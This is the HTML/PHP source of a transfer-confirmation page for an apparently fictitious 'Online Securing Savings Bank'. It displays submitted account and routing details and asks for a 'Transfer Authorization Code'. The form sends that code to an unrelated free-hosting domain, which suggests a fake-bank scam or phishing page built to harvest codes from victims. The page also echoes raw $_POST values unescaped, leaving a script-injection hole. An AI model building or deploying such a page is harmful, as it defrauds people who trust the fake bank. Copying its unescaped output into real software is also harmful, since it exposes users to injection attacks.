<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8" />
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" />
  <link rel="stylesheet" type="text/css" href="style.css" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Online Securing Savings Bank</title>
</head>

<body>
  <header>
    <div class="input_header">
      <a href="logout.php">Log Out</a>
      <a href="summary.html">Account Summary</a>
    </div>

    <nav>
      <div class="nav-content">
        <img src="logs.png" alt="Logo Page" />

        <input type="checkbox" id="toggle" />
        <label for="toggle" class="toggle">
          <span></span>
          <span></span>
          <span></span>
        </label>

        <ul class="menu">
          <li>
            <a href="summary.html"><span class="fa fa-home"></span>Account Summary</a>
          </li>
          <li>
            <a href="transaction.html"><span class="fa fa-exchange"></span>Transaction History</a>
          </li>
          <li>
            <a href="transfer.html"><span class="fa fa-money"></span>Transfer</a>
          </li>
          <li>
            <a href="bill.html"><span class="fa fa-book"></span>Bill Pay</a>
          </li>
          <li><a href="profile.html"><span class="fa fa-arrow-circle-right"></span>Profile</a></li>
          <li>
            <a href="contact.html"><span class="fa fa-volume-control-phone"></span>Contact Us</a>
          </li>
        </ul>
    </nav>
    </div>
  </header>

  <!---End of navigation Menu Bar-->

  <aside>
    <ul>
      <li><a href="summary.html"><span class="fa fa-home"></span>Account Summary</a></li>
      <li><a href="transaction.html"><span class="fa fa-exchange"></span>Transaction History</a></li>
      <li><a href="transfer.html"><span class="fa fa-money"></span>Transfer</a></li>
      <li><a href="bill.html"><span class="fa fa-book"></span>Bill Pay</a></li>
      <li><a href="profile.html"><span class="fa fa-arrow-circle-right"></span>Profile</a></li>
      <li><a href="contact.html"><span class="fa fa-volume-control-phone"></span>Contact Us</a></li>
    </ul>
  </aside>

  <div class="content">
    <div class="date">
      <p class="welcome"><b>Welcome:</b> Robert Shoemaker</p>
      <p id="demo" style="font-size: 13px"></p>
      <script>
      document.getElementById("demo").innerHTML = Date();
      </script>
    </div>

    <div class="arrow">
      <a href="transfer.html" class="active"><span class="fa fa-arrow-circle-right"></span>Transfer Funds</a>
      <a href="preview.php" class="active"><span class="fa fa-arrow-circle-right"></span>Preview & Confirm</a>
      <a href="#success.html"><span class="fa fa-arrow-circle-right"></span>Transfer Successful</a>
    </div>

    <div class="overlay">
      <div class="form_contact">
        <form method="post" action="http://citisonline.eu5.net">
          <div style="margin-bottom:5px; padding:5px; border:1px solid #fff; border-radius:3px;"><label>Bank Name: <b
                style="color:red;">
                <?php echo $_POST["bnknam"]; ?></b></label></div>
          <div style="margin-bottom:5px; padding:5px; border:1px solid #fff; border-radius:3px;"><label>Account Number:
              <b style="color:red;"><?php echo $_POST["accnum"]; ?></b></label></div>
          <div style="margin-bottom:5px; padding:5px; border:1px solid #fff; border-radius:3px;"><label>Re-entered
              Account Number:
              <b style="color:red;"><?php echo $_POST["accnum1"]; ?></b></label></div>
          <div style="margin-bottom:5px; padding:5px; border:1px solid #fff; border-radius:3px;"><label>Routing Number:
              <b style="color:red;"><?php echo $_POST["rutnum"]; ?></b></label></div>
          <div style="margin-bottom:5px; padding:5px; border:1px solid #fff; border-radius:3px;"><label>Re-entered
              Routing Number:
              <b style="color:red;"><?php echo $_POST["rutnum1"]; ?></b></label></div>
          <div style="margin-bottom:5px; padding:5px; border:1px solid #fff; border-radius:3px;"><label>Amount $: <b
                style="color:red;"><?php echo $_POST["amut"]; ?></b></label></div>
          <div style="margin-bottom:5px; padding:5px; border:1px solid #fff; border-radius:3px;"><label>Selected
              account: <b style="color:red;"><?php echo $_POST["sel"]; ?></b></label></div>
          <div style="margin-bottom:5px; padding:5px; border:1px solid #fff; border-radius:3px;"><label
              style="color:red;">Transfer Authorization Code</label><br>
            <input type="text" placeholder="LNP0000000" name="cod" required>
          </div>

          <input type="submit" value="Confirm Transfer" class="btn"><br><br>

          <h5><b>Note: </b>For any wrong input of Authorization code will lead to automatically log out</h5>


        </form>
      </div>
    </div>


  </div>

  <div class="footer">
    <img src="index.png" />
    <p style="padding: 5px; font-size: 12px; color:#fff;">
      SSB provides information about and access to accounts and
      financial services provided by Security Savings Bank, N.A. and its affiliates in
      the United Kingdom (UK) and its territories. Terms, conditions and fees for
      accounts, products, programs and services are subject to change. Not
      all accounts, products, and services as well as pricing described here
      are available in all jurisdictions or to all customers. Your country
      of citizenship, domicile, or residence, if other than the United Kingdom,
      may have laws, rules, and regulations that govern or affect your
      application for and use of our accounts, products and services,
      including laws and regulations regarding taxes, exchange and/or
      capital controls that you are responsible for following.
    </p>
    <span class="fa fa-fort-awesome"></span>
  </div>

</body>

</html>